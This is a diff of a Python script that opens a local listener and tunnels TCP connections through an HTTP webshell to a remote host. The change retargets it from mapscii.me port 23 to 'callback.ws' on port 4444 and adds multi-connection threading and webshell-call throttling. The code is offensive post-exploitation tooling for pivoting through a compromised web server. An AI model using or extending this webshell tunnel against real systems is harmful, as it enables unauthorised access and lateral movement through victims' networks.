@@ -1,8 +1,4 @@
-import socket
-import time
-
-import requests
-
+import threading
 import socket
 import select
 import requests
@@ -10,8 +6,8 @@ import time
 
 URL = "http://127.0.0.1:5000/webshell"
 
-TARGET_HOST = "mapscii.me"
-TARGET_PORT = 23
+TARGET_HOST = "callback.ws"
+TARGET_PORT = 4444
 
 def handle(sobj, addr):
     session_id = int(time.time())
@@ -27,7 +23,7 @@ def handle(sobj, addr):
     got_data = True
     while True:
         if not got_data:
-            time.sleep(1)
+            time.sleep(1)  # Throttle webshell calling
         got_data = False
 
         ready_to_read, _, _ = select.select([sobj], [], [], 0)  # setting timeout to 0 for non-blocking operation
@@ -61,12 +57,15 @@ def handle(sobj, addr):
 
 
 
+
+
 def listen_server():
     sobj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sobj.bind(('127.0.0.1', 9999))
     sobj.listen(5)
-    client, addr = sobj.accept()
-    handle(client, addr)
+    while True:
+        client, addr = sobj.accept()
+        threading.Thread(target=handle, args=(client, addr)).start()
 
 if __name__ == '__main__':
     listen_server()
